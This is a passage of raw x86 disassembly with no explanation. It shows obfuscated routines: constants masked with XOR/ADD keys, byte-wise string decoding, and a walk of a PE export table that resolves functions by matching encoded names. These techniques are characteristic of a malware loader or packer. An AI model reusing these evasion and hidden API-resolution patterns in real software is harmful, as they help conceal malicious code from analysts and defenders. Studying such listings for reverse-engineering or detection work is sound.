  41f6a4:	add    eax,DWORD PTR [ebp-0x8]
  41f6a7:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6aa:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ad:	mov    ecx,DWORD PTR [ecx]
  41f6af:	mov    DWORD PTR [eax],ecx
  41f6b1:	mov    eax,DWORD PTR [ebp-0xc]
  41f6b4:	xor    eax,0x751089b
  41f6b9:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6bc:	lea    eax,[ecx+eax*1+0x3272e2]
  41f6c3:	mov    DWORD PTR [ebp-0x8],eax
  41f6c6:	jmp    0x41f723
  41f6c8:	mov    eax,DWORD PTR [ebp+0x10]
  41f6cb:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6ce:	sub    eax,ecx
  41f6d0:	mov    ecx,DWORD PTR [ebp-0x4]
  41f6d3:	xor    ecx,0x751089b
  41f6d9:	add    ecx,0x3272e2
  41f6df:	cmp    eax,ecx
  41f6e1:	jbe    0x41f70c
  41f6e3:	mov    eax,DWORD PTR [ebp+0x8]
  41f6e6:	add    eax,DWORD PTR [ebp-0x8]
  41f6e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6ec:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ef:	mov    cx,WORD PTR [ecx]
  41f6f2:	mov    WORD PTR [eax],cx
  41f6f5:	mov    eax,DWORD PTR [ebp-0x4]
  41f6f8:	xor    eax,0x751089b
  41f6fd:	mov    ecx,DWORD PTR [ebp-0x8]
  41f700:	lea    eax,[ecx+eax*1+0x3272e2]
  41f707:	mov    DWORD PTR [ebp-0x8],eax
  41f70a:	jmp    0x41f723
  41f70c:	mov    eax,DWORD PTR [ebp+0x8]
  41f70f:	add    eax,DWORD PTR [ebp-0x8]
  41f712:	mov    ecx,DWORD PTR [ebp+0xc]
  41f715:	add    ecx,DWORD PTR [ebp-0x8]
  41f718:	mov    cl,BYTE PTR [ecx]
  41f71a:	mov    BYTE PTR [eax],cl
  41f71c:	mov    eax,DWORD PTR [ebp-0x8]
  41f71f:	inc    eax
  41f720:	mov    DWORD PTR [ebp-0x8],eax
  41f723:	jmp    0x41f60c
  41f728:	leave  
  41f729:	ret    0xc
  41f72c:	push   ebp
  41f72d:	mov    ebp,esp
  41f72f:	sub    esp,0xc
  41f732:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f739:	push   esi
  41f73a:	mov    esi,eax
  41f73c:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41f743:	mov    edx,DWORD PTR [ebp-0x4]
  41f746:	mov    eax,0x751089b
  41f74b:	xor    edx,eax
  41f74d:	mov    ecx,0x3272e2
  41f752:	add    edx,ecx
  41f754:	cmp    esi,edx
  41f756:	je     0x41f798
  41f758:	push   ebx
  41f759:	push   edi
  41f75a:	mov    edx,DWORD PTR [ebp-0x8]
  41f75d:	mov    ebx,DWORD PTR [ebp+0x8]
  41f760:	xor    edx,eax
  41f762:	mov    edi,0xffcd8d1e
  41f767:	sub    edi,edx
  41f769:	add    esi,edi
  41f76b:	lea    edx,[esi-0x3272e2]
  41f771:	xor    edx,eax
  41f773:	mov    DWORD PTR [ebp-0xc],edx
  41f776:	mov    edx,DWORD PTR [ebp-0x4]
  41f779:	mov    edi,DWORD PTR [ebp-0xc]
  41f77c:	xor    dl,0x9b
  41f77f:	sub    dl,0x1e
  41f782:	xor    edi,eax
  41f784:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  41f78b:	mov    edx,DWORD PTR [ebp-0x4]
  41f78e:	xor    edx,eax
  41f790:	add    edx,ecx
  41f792:	cmp    esi,edx
  41f794:	jne    0x41f75a
  41f796:	pop    edi
  41f797:	pop    ebx
  41f798:	pop    esi
  41f799:	leave  
  41f79a:	ret    0x4
  41f79d:	push   ebp
  41f79e:	mov    ebp,esp
  41f7a0:	sub    esp,0x21c
  41f7a6:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f7ad:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41f7b4:	mov    eax,DWORD PTR [ebp+0x10]
  41f7b7:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41f7bd:	push   esi
  41f7be:	push   edi
  41f7bf:	mov    edi,0x751089b
  41f7c4:	xor    eax,edi
  41f7c6:	mov    esi,0x3272e2
  41f7cb:	add    eax,esi
  41f7cd:	cmp    eax,ecx
  41f7cf:	mov    eax,DWORD PTR [ebp-0x4]
  41f7d2:	jne    0x41f7dd
  41f7d4:	xor    eax,edi
  41f7d6:	add    eax,esi
  41f7d8:	jmp    0x41f889
  41f7dd:	mov    ecx,DWORD PTR [ebp+0xc]
  41f7e0:	xor    eax,edi
  41f7e2:	add    eax,esi
  41f7e4:	cmp    eax,ecx
  41f7e6:	jne    0x41f7ed
  41f7e8:	mov    eax,DWORD PTR [ebp-0x4]
  41f7eb:	jmp    0x41f7d4
  41f7ed:	lea    eax,[ebp-0x21c]
  41f7f3:	mov    DWORD PTR [ebp-0x8],eax
  41f7f6:	mov    eax,DWORD PTR [ebp+0xc]
  41f7f9:	mov    DWORD PTR [ebp-0x10],eax
  41f7fc:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ff:	xor    eax,edi
  41f801:	add    eax,esi
  41f803:	mov    DWORD PTR [ebp+0x10],eax
  41f806:	mov    eax,DWORD PTR [ebp+0xc]
  41f809:	push   ebx
  41f80a:	call   0x41f4e5
  41f80f:	mov    ebx,eax
  41f811:	mov    eax,DWORD PTR [ebp+0x8]
  41f814:	mov    eax,DWORD PTR [eax+0x14]
  41f817:	jmp    0x41f871
  41f819:	mov    eax,DWORD PTR [ebp+0xc]
  41f81c:	sub    eax,0x8
  41f81f:	mov    DWORD PTR [ebp-0xc],eax
  41f822:	mov    eax,DWORD PTR [ebp-0xc]
  41f825:	mov    eax,DWORD PTR [eax+0x28]
  41f828:	call   0x41f3cd
  41f82d:	mov    DWORD PTR [ebp+0x10],eax
  41f830:	push   DWORD PTR [ebp+0x10]
  41f833:	mov    edx,DWORD PTR [ebp-0x8]
  41f836:	call   0x41f574
  41f83b:	mov    eax,DWORD PTR [ebp-0x4]
  41f83e:	xor    eax,edi
  41f840:	add    eax,esi
  41f842:	cmp    eax,ebx
  41f844:	jne    0x41f84e
  41f846:	mov    eax,DWORD PTR [ebp-0x8]
  41f849:	call   0x41f45b
  41f84e:	mov    eax,DWORD PTR [ebp-0x14]
  41f851:	xor    eax,edi
  41f853:	add    eax,esi
  41f855:	push   eax
  41f856:	push   DWORD PTR [ebp-0x10]
  41f859:	mov    eax,DWORD PTR [ebp-0x8]
  41f85c:	call   0x41f187
  41f861:	mov    ecx,DWORD PTR [ebp-0x4]
  41f864:	xor    ecx,edi
  41f866:	add    ecx,esi
  41f868:	cmp    eax,ecx
  41f86a:	je     0x41f88f
  41f86c:	mov    eax,DWORD PTR [ebp+0xc]
  41f86f:	mov    eax,DWORD PTR [eax]
  41f871:	mov    DWORD PTR [ebp+0xc],eax
  41f874:	mov    eax,DWORD PTR [ebp+0x8]
  41f877:	mov    ecx,DWORD PTR [ebp+0xc]
  41f87a:	add    eax,0x14
  41f87d:	cmp    ecx,eax
  41f87f:	jne    0x41f819
  41f881:	mov    eax,DWORD PTR [ebp-0x4]
  41f884:	xor    eax,edi
  41f886:	add    eax,esi
  41f888:	pop    ebx
  41f889:	pop    edi
  41f88a:	pop    esi
  41f88b:	leave  
  41f88c:	ret    0xc
  41f88f:	mov    eax,DWORD PTR [ebp-0xc]
  41f892:	mov    eax,DWORD PTR [eax+0x18]
  41f895:	jmp    0x41f888
  41f897:	push   ebp
  41f898:	mov    ebp,esp
  41f89a:	mov    eax,DWORD PTR [ebp+0xc]
  41f89d:	sub    esp,0x10
  41f8a0:	cmp    DWORD PTR [ebp+0x8],0x0
  41f8a4:	push   ebx
  41f8a5:	push   esi
  41f8a6:	push   edi
  41f8a7:	je     0x41f95c
  41f8ad:	test   eax,eax
  41f8af:	je     0x41f95c
  41f8b5:	movzx  eax,WORD PTR [eax+0x20]
  41f8b9:	mov    ecx,eax
  41f8bb:	mov    DWORD PTR [ebp-0x10],eax
  41f8be:	xor    edx,edx
  41f8c0:	and    DWORD PTR [ebp-0x8],edx
  41f8c3:	mov    eax,0x8a8d
  41f8c8:	xor    ecx,eax
  41f8ca:	add    ecx,0x3b51
  41f8d0:	mov    DWORD PTR [ebp-0xc],ecx
  41f8d3:	and    DWORD PTR [ebp-0x4],0x0
  41f8d7:	xor    ecx,ecx
  41f8d9:	push   0x7e
  41f8db:	pop    edi
  41f8dc:	cmp    cx,WORD PTR [ebp-0xc]
  41f8e0:	jae    0x41f946
  41f8e2:	lea    esi,[edx-0x3b51]
  41f8e8:	xor    esi,eax
  41f8ea:	movzx  ecx,WORD PTR [ebp-0x4]
  41f8ee:	mov    ebx,DWORD PTR [ebp+0xc]
  41f8f1:	lea    ecx,[ebx+ecx*4]
  41f8f4:	cmp    WORD PTR [ecx+0x2],si
  41f8f8:	jne    0x41f931
  41f8fa:	movzx  ecx,WORD PTR [ecx]
  41f8fd:	mov    edi,0x4e22
  41f902:	cmp    cx,di
  41f905:	jne    0x41f913
  41f907:	mov    ebx,DWORD PTR [ebp+0x8]
  41f90a:	movzx  edi,dx
  41f90d:	cmp    BYTE PTR [edi+ebx*1],0x0
  41f911:	je     0x41f940
  41f913:	mov    ebx,DWORD PTR [ebp+0x8]
  41f916:	movzx  edi,dx
  41f919:	movsx  di,BYTE PTR [edi+ebx*1]
  41f91e:	mov    ebx,0x3b51
  41f923:	sub    di,bx
  41f926:	xor    di,ax
  41f929:	cmp    cx,di
  41f92c:	je     0x41f940
  41f92e:	push   0x7c
  41f930:	pop    edi
  41f931:	inc    DWORD PTR [ebp-0x4]
  41f934:	mov    cx,WORD PTR [ebp-0xc]
  41f938:	cmp    WORD PTR [ebp-0x4],cx
  41f93c:	jb     0x41f8ea
  41f93e:	jmp    0x41f946
  41f940:	inc    DWORD PTR [ebp-0x8]
  41f943:	push   0x7d
  41f945:	pop    edi
  41f946:	mov    esi,DWORD PTR [ebp+0x8]
  41f949:	movzx  ecx,dx
  41f94c:	cmp    BYTE PTR [ecx+esi*1],0x0
  41f950:	je     0x41f965
  41f952:	inc    edx
  41f953:	cmp    edi,0x7c
  41f956:	jne    0x41f8d3
  41f95c:	xor    eax,eax
  41f95e:	pop    edi
  41f95f:	pop    esi
  41f960:	pop    ebx
  41f961:	leave  
  41f962:	ret    0x8
  41f965:	mov    ecx,DWORD PTR [ebp-0x8]
  41f968:	add    ecx,0xffffc4af
  41f96e:	xor    cx,ax
  41f971:	xor    eax,eax
  41f973:	cmp    cx,WORD PTR [ebp-0x10]
  41f977:	sete   al
  41f97a:	jmp    0x41f95e
  41f97c:	push   ebp
  41f97d:	mov    ebp,esp
  41f97f:	sub    esp,0x50
  41f982:	push   edi
  41f983:	mov    edi,eax
  41f985:	mov    eax,DWORD PTR [edi+0x1a8]
  41f98b:	cmp    DWORD PTR [eax],0x0
  41f98e:	jne    0x41f997
  41f990:	xor    eax,eax
  41f992:	jmp    0x41fac8
  41f997:	push   DWORD PTR [ebp+0x8]
  41f99a:	push   0x2c
  41f99c:	pop    eax
  41f99d:	call   0x41f72c
  41f9a2:	mov    edx,DWORD PTR [edi+0x1ac]
  41f9a8:	lea    eax,[edi+0x22]
  41f9ab:	mov    DWORD PTR [ebp-0x4c],eax
  41f9ae:	lea    eax,[edi+0x44]
  41f9b1:	mov    DWORD PTR [ebp-0x48],eax
  41f9b4:	lea    eax,[edi+0x66]
  41f9b7:	mov    DWORD PTR [ebp-0x44],eax
  41f9ba:	lea    eax,[edi+0x88]
  41f9c0:	mov    DWORD PTR [ebp-0x40],eax
  41f9c3:	lea    eax,[edi+0xaa]
  41f9c9:	mov    DWORD PTR [ebp-0x3c],eax
  41f9cc:	lea    eax,[edi+0xcc]
  41f9d2:	mov    DWORD PTR [ebp-0x38],eax
  41f9d5:	lea    eax,[edi+0xee]
  41f9db:	mov    DWORD PTR [ebp-0x34],eax
  41f9de:	lea    eax,[edi+0x110]
  41f9e4:	mov    DWORD PTR [ebp-0x30],eax
  41f9e7:	lea    eax,[edi+0x132]
  41f9ed:	mov    DWORD PTR [ebp-0x2c],eax
  41f9f0:	lea    eax,[edi+0x154]
  41f9f6:	push   edi
  41f9f7:	mov    DWORD PTR [ebp-0x50],edi
  41f9fa:	mov    DWORD PTR [ebp-0x28],eax
  41f9fd:	call   0x41fafc
  41fa02:	push   eax
  41fa03:	mov    eax,DWORD PTR [edi+0x1a8]
  41fa09:	push   DWORD PTR [eax]
  41fa0b:	call   0x41f79d
  41fa10:	mov    DWORD PTR [ebp-0x10],eax
  41fa13:	test   eax,eax
  41fa15:	je     0x41fac8
  41fa1b:	mov    ecx,DWORD PTR [eax+0x3c]
  41fa1e:	push   ebx
  41fa1f:	push   esi
  41fa20:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41fa24:	add    esi,eax
  41fa26:	mov    edi,DWORD PTR [esi+0x24]
  41fa29:	mov    ecx,DWORD PTR [esi+0x1c]
  41fa2c:	mov    edx,DWORD PTR [esi+0x20]
  41fa2f:	mov    ebx,DWORD PTR [esi+0x18]
  41fa32:	add    edi,eax
  41fa34:	mov    DWORD PTR [ebp-0x20],edi
  41fa37:	mov    edi,DWORD PTR [esi+0x14]
  41fa3a:	add    ecx,eax
  41fa3c:	add    edx,eax
  41fa3e:	mov    DWORD PTR [ebp-0xc],ecx
  41fa41:	mov    DWORD PTR [ebp-0x1c],edx
  41fa44:	mov    DWORD PTR [ebp-0x8],edi
  41fa47:	cmp    edi,ebx
  41fa49:	ja     0x41fa4e
  41fa4b:	mov    DWORD PTR [ebp-0x8],ebx
  41fa4e:	xor    ebx,ebx
  41fa50:	mov    DWORD PTR [ebp-0x18],ebx
  41fa53:	cmp    DWORD PTR [ebp-0x8],ebx
  41fa56:	jbe    0x41fac6
  41fa58:	jmp    0x41fa5d
  41fa5a:	mov    edx,DWORD PTR [ebp-0x1c]
  41fa5d:	mov    edi,DWORD PTR [ebp-0x20]
  41fa60:	movzx  edi,WORD PTR [edi+ebx*2]
  41fa64:	cmp    ebx,DWORD PTR [esi+0x18]
  41fa67:	jae    0x41fac6
  41fa69:	cmp    edi,DWORD PTR [esi+0x14]
  41fa6c:	jae    0x41fac6
  41fa6e:	mov    ebx,DWORD PTR [edx+ebx*4]
  41fa71:	mov    edx,DWORD PTR [ebp+0x8]
  41fa74:	mov    edi,DWORD PTR [ecx+edi*4]
  41fa77:	mov    DWORD PTR [ebp-0x4],edx
  41fa7a:	lea    edx,[ebp-0x50]
  41fa7d:	add    ebx,eax
  41fa7f:	add    edi,eax
  41fa81:	sub    edx,DWORD PTR [ebp+0x8]
  41fa84:	mov    DWORD PTR [ebp-0x14],0xb
  41fa8b:	mov    DWORD PTR [ebp-0x24],edx
  41fa8e:	mov    edx,DWORD PTR [ebp-0x4]
  41fa91:	cmp    DWORD PTR [edx],0x0
  41fa94:	jne    0x41fab1
  41fa96:	mov    eax,DWORD PTR [ebp-0x24]
  41fa99:	push   DWORD PTR [eax+edx*1]
  41fa9c:	push   ebx
  41fa9d:	call   0x41f897
  41faa2:	mov    ecx,DWORD PTR [ebp-0xc]
  41faa5:	test   eax,eax
  41faa7:	je     0x41faae
  41faa9:	mov    eax,DWORD PTR [ebp-0x4]
  41faac:	mov    DWORD PTR [eax],edi
  41faae:	mov    eax,DWORD PTR [ebp-0x10]
  41fab1:	add    DWORD PTR [ebp-0x4],0x4
  41fab5:	dec    DWORD PTR [ebp-0x14]
  41fab8:	jne    0x41fa8e
  41faba:	mov    ebx,DWORD PTR [ebp-0x18]
  41fabd:	inc    ebx
  41fabe:	mov    DWORD PTR [ebp-0x18],ebx
  41fac1:	cmp    ebx,DWORD PTR [ebp-0x8]
  41fac4:	jb     0x41fa5a
  41fac6:	pop    esi
  41fac7:	pop    ebx
  41fac8:	pop    edi
  41fac9:	leave  
  41faca:	ret    0x4
  41facd:	push   ebp
  41face:	mov    ebp,esp
  41fad0:	mov    eax,DWORD PTR [ebp+0x8]
  41fad3:	push   esi
  41fad4:	push   DWORD PTR [eax+0x1d8]
  41fada:	lea    esi,[eax+0x198]
  41fae0:	mov    eax,DWORD PTR [ebp+0x8]
  41fae3:	call   0x41f97c
  41fae8:	mov    ecx,DWORD PTR [esi]
  41faea:	mov    DWORD PTR [ecx],eax
  41faec:	mov    eax,DWORD PTR [esi]
  41faee:	xor    ecx,ecx
  41faf0:	cmp    DWORD PTR [eax],ecx
  41faf2:	pop    esi
  41faf3:	setne  cl
  41faf6:	mov    eax,ecx
  41faf8:	pop    ebp
  41faf9:	ret    0x4
  41fafc:	mov    ecx,DWORD PTR [edi+0x188]
  41fb02:	push   ebx
  41fb03:	jmp    0x41fb18
  41fb05:	xor    eax,0x8a8d
  41fb0a:	add    eax,0x3b51
  41fb0f:	mov    WORD PTR [ecx],ax
  41fb12:	add    ecx,0x2
  41fb15:	add    edx,0x2
  41fb18:	movzx  eax,WORD PTR [edx]
  41fb1b:	mov    ebx,0x4e22
  41fb20:	cmp    ax,bx
  41fb23:	jne    0x41fb05
  41fb25:	xor    eax,eax
  41fb27:	mov    WORD PTR [ecx],ax
  41fb2a:	mov    eax,DWORD PTR [edi+0x188]
  41fb30:	pop    ebx
  41fb31:	ret    
  41fb32:	push   edi
  41fb33:	mov    edi,eax
  41fb35:	mov    eax,DWORD PTR [esi+0x188]
  41fb3b:	shl    edi,0x6
  41fb3e:	add    eax,edi
  41fb40:	jmp    0x41fb4c
  41fb42:	xor    cl,0x74
  41fb45:	sub    cl,0x8
  41fb48:	mov    BYTE PTR [eax],cl
  41fb4a:	inc    eax
  41fb4b:	inc    edx
  41fb4c:	mov    cl,BYTE PTR [edx]
  41fb4e:	cmp    cl,0x7c
  41fb51:	jne    0x41fb42
  41fb53:	mov    BYTE PTR [eax],0x0
  41fb56:	mov    eax,DWORD PTR [esi+0x188]
  41fb5c:	add    eax,edi
  41fb5e:	pop    edi
  41fb5f:	ret    
  41fb60:	push   ebp
  41fb61:	mov    ebp,esp
  41fb63:	sub    esp,0x38
  41fb66:	push   ebx
  41fb67:	mov    ebx,0xf89c8585
  41fb6c:	mov    DWORD PTR [ebp-0x4],ebx
  41fb6f:	lea    eax,[ebx-0x1]
  41fb72:	push   esi
  41fb73:	mov    DWORD PTR [ebp-0x24],eax
  41fb76:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb79:	mov    edx,DWORD PTR [ebp+0x8]
  41fb7c:	mov    esi,0x751089b
  41fb81:	push   edi
  41fb82:	xor    ecx,esi
  41fb84:	mov    edi,0x3272e2
  41fb89:	add    ecx,edi
  41fb8b:	cmp    edx,ecx
  41fb8d:	je     0x41fcfb
  41fb93:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb96:	mov    edx,DWORD PTR [ebp+0xc]
  41fb99:	xor    ecx,esi
  41fb9b:	add    ecx,edi
  41fb9d:	cmp    edx,ecx
  41fb9f:	je     0x41fcfb
  41fba5:	mov    ecx,DWORD PTR [ebp+0x10]
  41fba8:	mov    DWORD PTR [ebp-0x18],ecx
  41fbab:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbae:	mov    DWORD PTR [ebp-0x14],ecx
  41fbb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbb4:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  41fbbb:	mov    DWORD PTR [ebp-0x20],eax
  41fbbe:	mov    DWORD PTR [ebp-0x10],ebx
  41fbc1:	mov    DWORD PTR [ebp+0xc],eax
  41fbc4:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41fbcb:	mov    eax,DWORD PTR [ebp+0xc]
  41fbce:	mov    DWORD PTR [ebp-0xc],ecx
  41fbd1:	xor    eax,esi
  41fbd3:	mov    ecx,0xffcd8d1e
  41fbd8:	sub    ecx,eax
  41fbda:	add    ecx,DWORD PTR [ebp-0x14]
  41fbdd:	mov    DWORD PTR [ebp+0x8],ecx
  41fbe0:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41fbe7:	jmp    0x41fceb
  41fbec:	mov    eax,DWORD PTR [ebp+0xc]
  41fbef:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbf2:	xor    eax,esi
  41fbf4:	xor    ecx,esi
  41fbf6:	lea    ecx,[eax+ecx*1+0x64e5c4]
  41fbfd:	mov    eax,DWORD PTR [ebp+0x8]
  41fc00:	xor    edx,edx
  41fc02:	div    ecx
  41fc04:	mov    eax,DWORD PTR [ebp+0x10]
  41fc07:	mov    ecx,DWORD PTR [ebp+0xc]
  41fc0a:	xor    eax,esi
  41fc0c:	xor    ecx,esi
  41fc0e:	sub    eax,ecx
  41fc10:	cmp    edx,eax
  41fc12:	jne    0x41fca7
  41fc18:	mov    eax,DWORD PTR [ebp+0x8]
  41fc1b:	add    eax,DWORD PTR [ebp-0xc]
  41fc1e:	mov    dl,BYTE PTR [eax]
  41fc20:	mov    eax,DWORD PTR [ebp-0x10]
  41fc23:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc26:	xor    eax,esi
  41fc28:	xor    ecx,esi
  41fc2a:	add    eax,edi
  41fc2c:	add    ecx,edi
  41fc2e:	cmp    eax,ecx
  41fc30:	jae    0x41fc78
  41fc32:	lea    ecx,[eax-0x3272e2]
  41fc38:	mov    DWORD PTR [ebp-0x4],ecx
  41fc3b:	mov    ebx,DWORD PTR [ebp-0x4]
  41fc3e:	xor    ebx,esi
  41fc40:	add    ebx,0x7f55d8fb
  41fc46:	lea    ecx,[ebp+eax*4-0x38]
  41fc4a:	mov    DWORD PTR [ecx],ebx
  41fc4c:	mov    ebx,DWORD PTR [ecx]
  41fc4e:	cmp    ebx,0x244ecbda
  41fc54:	jbe    0x41fc5e
  41fc56:	add    DWORD PTR [ecx],0x405fc19
  41fc5c:	jmp    0x41fc64
  41fc5e:	add    DWORD PTR [ecx],0xfdaf43e7
  41fc64:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc67:	xor    ecx,esi
  41fc69:	inc    eax
  41fc6a:	inc    DWORD PTR [ebp-0x4]
  41fc6d:	add    ecx,edi
  41fc6f:	cmp    eax,ecx
  41fc71:	jb     0x41fc3b
  41fc73:	mov    ebx,0xf89c8585
  41fc78:	mov    eax,DWORD PTR [ebp-0x18]
  41fc7b:	test   eax,eax
  41fc7d:	jne    0x41fc87
  41fc7f:	xor    dl,0x74
  41fc82:	sub    dl,0x8
  41fc85:	jmp    0x41fc9d
  41fc87:	mov    eax,DWORD PTR [ebp-0x1c]
  41fc8a:	xor    al,0x9b
  41fc8c:	mov    cl,0x1e
  41fc8e:	sub    cl,al
  41fc90:	add    dl,cl
  41fc92:	mov    ecx,DWORD PTR [ebp-0x20]
  41fc95:	xor    cl,0x9b
  41fc98:	sub    cl,0x1e
  41fc9b:	ror    dl,cl
  41fc9d:	xor    eax,eax
  41fc9f:	mov    eax,DWORD PTR [ebp+0x8]
  41fca2:	add    eax,DWORD PTR [ebp-0xc]
  41fca5:	mov    BYTE PTR [eax],dl
  41fca7:	mov    eax,DWORD PTR [ebp+0x8]
  41fcaa:	mov    ecx,DWORD PTR [ebp-0x10]
  41fcad:	sub    eax,edi
  41fcaf:	xor    eax,esi
  41fcb1:	cmp    eax,ecx
  41fcb3:	jne    0x41fcd9
  41fcb5:	mov    eax,DWORD PTR [ebp+0x10]
  41fcb8:	mov    ecx,DWORD PTR [ebp+0xc]
  41fcbb:	xor    eax,esi
  41fcbd:	xor    ecx,esi
  41fcbf:	sub    eax,ecx
  41fcc1:	sub    eax,edi
  41fcc3:	xor    eax,esi
  41fcc5:	mov    DWORD PTR [ebp+0x10],eax
  41fcc8:	mov    eax,DWORD PTR [ebp+0xc]
  41fccb:	xor    eax,esi
  41fccd:	mov    ecx,0xffcd8d1e
  41fcd2:	sub    ecx,eax
  41fcd4:	add    ecx,DWORD PTR [ebp-0x14]
  41fcd7:	jmp    0x41fce8
  41fcd9:	mov    eax,DWORD PTR [ebp+0xc]
  41fcdc:	xor    eax,esi
  41fcde:	mov    ecx,0xffcd8d1e
  41fce3:	sub    ecx,eax
  41fce5:	add    ecx,DWORD PTR [ebp+0x8]
  41fce8:	mov    DWORD PTR [ebp+0x8],ecx
  41fceb:	mov    eax,DWORD PTR [ebp+0x10]
  41fcee:	cmp    eax,ebx
  41fcf0:	jne    0x41fbec
  41fcf6:	mov    eax,DWORD PTR [ebp-0x24]
  41fcf9:	jmp    0x41fcfe
  41fcfb:	mov    eax,DWORD PTR [ebp-0x4]
  41fcfe:	xor    eax,esi
  41fd00:	add    eax,edi
  41fd02:	pop    edi
  41fd03:	pop    esi
  41fd04:	pop    ebx
  41fd05:	leave  
  41fd06:	ret    0xc
  41fd09:	push   ebp
  41fd0a:	mov    ebp,esp
  41fd0c:	sub    esp,0x14
  41fd0f:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41fd16:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  41fd1d:	mov    eax,DWORD PTR [ebx]
  41fd1f:	mov    DWORD PTR [ebp-0x8],eax
  41fd22:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41fd29:	push   esi
  41fd2a:	push   edi
  41fd2b:	mov    DWORD PTR [ebp-0x14],0xead718a5
  41fd32:	mov    edi,DWORD PTR [ebp-0x4]
  41fd35:	mov    ecx,DWORD PTR [ebp-0x10]
  41fd38:	mov    eax,0x751089b
  41fd3d:	xor    edi,eax
  41fd3f:	mov    edx,0x3272e2
  41fd44:	xor    ecx,eax
  41fd46:	add    edi,edx
  41fd48:	add    ecx,edx
  41fd4a:	imul   edi,ecx
  41fd4d:	jmp    0x41fd95
  41fd4f:	mov    ecx,DWORD PTR [ebp-0x8]
  41fd52:	mov    esi,DWORD PTR [ebp-0x4]
  41fd55:	xor    ecx,eax
  41fd57:	xor    esi,eax
  41fd59:	add    ecx,edx
  41fd5b:	add    esi,edx
  41fd5d:	test   esi,ecx
  41fd5f:	mov    esi,DWORD PTR [ebp-0x8]
  41fd62:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd65:	je     0x41fd7c
  41fd67:	xor    ecx,eax
  41fd69:	xor    esi,eax
  41fd6b:	add    ecx,edx
  41fd6d:	add    esi,edx
  41fd6f:	shr    esi,cl
  41fd71:	mov    ecx,DWORD PTR [ebp-0x14]
  41fd74:	xor    ecx,eax
  41fd76:	add    ecx,edx
  41fd78:	xor    esi,ecx
  41fd7a:	jmp    0x41fd86
  41fd7c:	xor    esi,eax
  41fd7e:	xor    ecx,eax
  41fd80:	add    esi,edx
  41fd82:	add    ecx,edx
  41fd84:	shr    esi,cl
  41fd86:	mov    DWORD PTR [ebp-0x8],esi
  41fd89:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd8c:	xor    ecx,eax
  41fd8e:	lea    edi,[edi+ecx*1+0x3272e2]
  41fd95:	mov    ecx,DWORD PTR [ebp-0xc]
  41fd98:	mov    esi,DWORD PTR [ebp-0x4]
  41fd9b:	xor    esi,eax
  41fd9d:	xor    ecx,eax
  41fd9f:	sub    ecx,esi
  41fda1:	cmp    edi,ecx
  41fda3:	jbe    0x41fd4f
  41fda5:	mov    eax,DWORD PTR [ebp-0x8]
  41fda8:	pop    edi
  41fda9:	mov    DWORD PTR [ebx],eax
  41fdab:	mov    eax,DWORD PTR [ebp-0x8]
  41fdae:	pop    esi
  41fdaf:	leave  
  41fdb0:	ret    
  41fdb1:	push   ebp
  41fdb2:	mov    ebp,esp
  41fdb4:	sub    esp,0x420
  41fdba:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41fdc1:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41fdc8:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  41fdcf:	push   ebx
  41fdd0:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41fdd7:	mov    eax,DWORD PTR [ebp-0x14]
  41fdda:	push   esi
  41fddb:	mov    esi,0x751089b
  41fde0:	push   edi
  41fde1:	xor    eax,esi
  41fde3:	mov    edi,0x3272e2
  41fde8:	add    eax,edi
  41fdea:	mov    DWORD PTR [ebp-0x8],eax
  41fded:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41fdf4:	mov    DWORD PTR [ebp-0x4],0xead718a5
  41fdfb:	mov    DWORD PTR [ebp-0x10],0x8
  41fe02:	mov    ecx,ecx
  41fe04:	mov    eax,DWORD PTR [ebp-0xc]
  41fe07:	mov    ecx,DWORD PTR [ebp-0x14]
  41fe0a:	xor    eax,esi
  41fe0c:	xor    ecx,esi
  41fe0e:	add    eax,edi
  41fe10:	add    ecx,edi
  41fe12:	imul   eax,ecx
  41fe15:	jmp    0x41fe48
  41fe17:	mov    eax,DWORD PTR [ebp-0x4]
  41fe1a:	sub    eax,edi
  41fe1c:	xor    eax,esi
  41fe1e:	mov    DWORD PTR [ebp-0x8],eax
  41fe21:	lea    ebx,[ebp-0x8]
  41fe24:	call   0x41fd09
  41fe29:	mov    DWORD PTR [ebp-0x8],eax
  41fe2c:	mov    eax,DWORD PTR [ebp-0x8]
  41fe2f:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe32:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41fe39:	mov    eax,DWORD PTR [ebp-0xc]
  41fe3c:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe3f:	xor    eax,esi
  41fe41:	lea    eax,[eax+ecx*1+0x3272e2]
  41fe48:	mov    DWORD PTR [ebp-0x4],eax
  41fe4b:	mov    eax,DWORD PTR [ebp-0x18]
  41fe4e:	mov    ecx,DWORD PTR [ebp-0xc]
  41fe51:	xor    ecx,esi
  41fe53:	xor    eax,esi
